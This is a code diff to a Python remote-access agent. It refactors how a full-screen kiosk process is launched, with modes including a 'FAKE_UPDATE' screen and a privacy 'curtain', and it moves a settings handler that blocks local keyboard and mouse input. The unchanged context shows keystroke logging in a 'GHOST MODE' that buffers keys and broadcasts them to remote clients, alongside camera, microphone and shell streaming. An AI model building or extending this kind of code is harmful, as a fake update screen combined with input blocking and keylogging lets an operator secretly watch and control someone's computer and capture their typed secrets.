@@ -161,6 +161,7 @@ class AsyncAgent:
         self.output_buffer = []
         self.MAX_BUFFER_SIZE = 5000
         self.reconnect_delay = 1.0 # Start with 1s
+        self.target_fps = 30 # Default FPS
 
 
     def _create_background_task(self, coro):
@@ -324,22 +325,19 @@ class AsyncAgent:
                 print("[*] Killing Kiosk Process...")
                 self.kiosk_process.terminate()
                 self.kiosk_process.wait(timeout=2)
-            except: pass
+            except subprocess.TimeoutExpired:
+                print("[!] Kiosk did not terminate, killing...")
+                self.kiosk_process.kill()
+                self.kiosk_process.wait(timeout=2)
+            except Exception:
+                pass # Ignore other errors
             self.kiosk_process = None
 
         # 2. Reset Resource Manager
         try:
-             # Just use existing reference if possible, else import
-             rm = None
-             if hasattr(self, 'resource_mgr') and self.resource_mgr:
-                 rm = self.resource_mgr
-             else:
-                 from core.resource_manager import get_resource_manager
-                 rm = get_resource_manager()
-             
-             if rm:
-                rm.set_viewer_connected(False)
-                rm.set_stream_enabled(False)
+             if self.resource_mgr:
+                self.resource_mgr.set_viewer_connected(False)
+                self.resource_mgr.set_stream_enabled(False)
         except Exception: pass
 
         # 3. Stop WebRTC
@@ -369,6 +367,56 @@ class AsyncAgent:
         except: pass
             
         print("[+] Session Cleanup Complete")
+
+    def _launch_kiosk(self, mode: str):
+        """Helper to launch the kiosk subprocess with a given mode."""
+        print(f"[*] Launching Kiosk Mode: {mode}")
+        
+        # Cleanup existing process if any
+        if self.kiosk_process and self.kiosk_process.poll() is None:
+            try:
+                self.kiosk_process.terminate()
+                self.kiosk_process.wait(timeout=1)
+            except: pass
+            self.kiosk_process = None
+
+        # Resolve kiosk script path (support frozen exe)
+        kiosk_script = None
+        if getattr(sys, 'frozen', False):
+            base_path = getattr(sys, '_MEIPASS', os.path.dirname(sys.executable))
+            kiosk_script = os.path.join(base_path, 'kiosk.py') # If bundled
+        else:
+            kiosk_script = os.path.join(os.path.dirname(__file__), 'kiosk.py')
+        
+        # Map protocol mode to CLI arg
+        cli_mode = "update"
+        if mode == "BLACK":
+            cli_mode = "black" # Pure Black
+        elif mode == "PRIVACY":
+            cli_mode = "privacy" # With Text
+        elif mode == "FAKE_UPDATE":
+            cli_mode = "update"
+            
+        # Build Command
+        cmd = []
+        if getattr(sys, 'frozen', False):
+            # When frozen, we run ourself with --kiosk and pass mode
+            cmd = [sys.executable, "--kiosk", "--mode", cli_mode]
+        else:
+            # Source mode
+            cmd = [sys.executable, kiosk_script, "--mode", cli_mode]
+
+        try:
+            creation_flags = 0
+            if os.name == 'nt':
+                creation_flags = subprocess.CREATE_NO_WINDOW
+            
+            self.kiosk_process = subprocess.Popen(
+                cmd,
+                creationflags=creation_flags
+            )
+        except Exception as e:
+             print(f"[-] Failed to launch kiosk: {e}")
 
     def _validate_troll_request(self, opcode, payload_str):
         """Validate Troll OpCode against Consent, Admin Token, and Cooldown."""
@@ -627,7 +675,6 @@ class AsyncAgent:
                     # Buffered text input
                     try:
                         text = payload.decode('utf-8')
-                        print(f"[*] Buffer Recv: '{text}'")
                         await self.loop.run_in_executor(None, self.input_ctrl.type_text, text)
                     except Exception as e:
                         print(f"[-] Buffer Input Error: {e}")
@@ -665,54 +712,7 @@ class AsyncAgent:
                         mode = payload.decode('utf-8')
                     except Exception:
                         mode = "BLACK"
-                        
-                    print(f"[*] Launching Kiosk Mode: {mode}")
-                    
-                    # Cleanup existing process if any
-                    if self.kiosk_process and self.kiosk_process.poll() is None:
-                        try:
-                            self.kiosk_process.terminate()
-                            self.kiosk_process.wait(timeout=1)
-                        except: pass
-                        self.kiosk_process = None
-
-                    # Resolve kiosk script path (support frozen exe)
-                    kiosk_script = None
-                    if getattr(sys, 'frozen', False):
-                        base_path = getattr(sys, '_MEIPASS', os.path.dirname(sys.executable))
-                        kiosk_script = os.path.join(base_path, 'kiosk.py') # If bundled
-                    else:
-                        kiosk_script = os.path.join(os.path.dirname(__file__), 'kiosk.py')
-                    
-                    # Map protocol mode to CLI arg
-                    cli_mode = "update"
-                    if mode == "BLACK":
-                        cli_mode = "black" # Pure Black
-                    elif mode == "PRIVACY":
-                        cli_mode = "privacy" # With Text
-                    elif mode == "FAKE_UPDATE":
-                        cli_mode = "update"
-                        
-                    # Build Command
-                    cmd = []
-                    if getattr(sys, 'frozen', False):
-                        # When frozen, we run ourself with --kiosk and pass mode
-                        cmd = [sys.executable, "--kiosk", "--mode", cli_mode]
-                    else:
-                        # Source mode
-                        cmd = [sys.executable, kiosk_script, "--mode", cli_mode]
-
-                    try:
-                        creation_flags = 0
-                        if os.name == 'nt':
-                            creation_flags = subprocess.CREATE_NO_WINDOW
-                        
-                        self.kiosk_process = subprocess.Popen(
-                            cmd,
-                            creationflags=creation_flags
-                        )
-                    except Exception as e:
-                         print(f"[-] Failed to launch kiosk: {e}")
+                    self._launch_kiosk(mode)
 
                 elif opcode == protocol.OP_CURTAIN_OFF:
                     if self.kiosk_process:
@@ -847,6 +847,29 @@ class AsyncAgent:
                         
                         if setting_id == protocol.SETTING_BLOCK_INPUT:
                             self.input_ctrl.block_input(bool(value))
+                        
+                        # ID 2 = SETTING_PRIVACY (from protocol.py)
+                        elif setting_id == 2: 
+                            if value:
+                                # Enable Privacy Mode
+                                print("[+] Privacy Mode ENABLED")
+                                self._launch_kiosk(mode="privacy")
+                                
+                                # Use New Hook-Based Blocker via Controller
+                                if self.input_ctrl:
+                                    self.input_ctrl.block_input(True)
+                            else:
+                                # Disable Privacy Mode
+                                print("[-] Privacy Mode DISABLED")
+                                if self.kiosk_process:
+                                    try:
+                                        self.kiosk_process.terminate()
+                                    except: pass
+                                    self.kiosk_process = None
+                                
+                                # Disable Blocker
+                                if self.input_ctrl:
+                                    self.input_ctrl.block_input(False)
                             
                     except Exception as e:
                         print(f"[-] Setting Error: {e}")
@@ -1156,43 +1179,6 @@ class AsyncAgent:
                     self.cam_streaming = False
                     self.mic_streaming = False
                     self.shell_handler.stop()
-                
-                # ================================================================
-                # SETTINGS HANDLER (Missing Link)
-                # ================================================================
-                elif opcode == protocol.OP_SETTING:
-                    try:
-                        data = json.loads(payload.decode('utf-8'))
-                        setting_id = data.get('id')
-                        value = data.get('value')
-                        
-                        print(f"[*] Setting Change: ID={setting_id} Val={value}")
-                        
-                        # ID 2 = SETTING_PRIVACY (from protocol.py)
-                        if setting_id == 2: 
-                            if value:
-                                # Enable Privacy Mode
-                                print("[+] Privacy Mode ENABLED")
-                                self._launch_kiosk(mode="privacy")
-                                
-                                # Use New Hook-Based Blocker via Controller
-                                if self.input_ctrl:
-                                    self.input_ctrl.block_input(True)
-                            else:
-                                # Disable Privacy Mode
-                                print("[-] Privacy Mode DISABLED")
-                                if self.kiosk_process:
-                                    try:
-                                        self.kiosk_process.terminate()
-                                    except: pass
-                                    self.kiosk_process = None
-                                
-                                # Disable Blocker
-                                if self.input_ctrl:
-                                    self.input_ctrl.block_input(False)
-                                    
-                    except Exception as e:
-                        print(f"[-] Setting Error: {e}")
                 
                 return 
         except Exception as e:
@@ -1594,8 +1580,6 @@ class AsyncAgent:
                 # GHOST MODE: Buffer keystrokes
                 if len(self.output_buffer) < self.MAX_BUFFER_SIZE:
                     self.output_buffer.append((protocol.OP_KEY_LOG, key_str.encode('utf-8')))
-
-            print(f"[DEBUG] Sent Keylog: {repr(key_str)}")
 
             # Broadcast to All Direct Clients
             for client in list(self.direct_ws_clients):
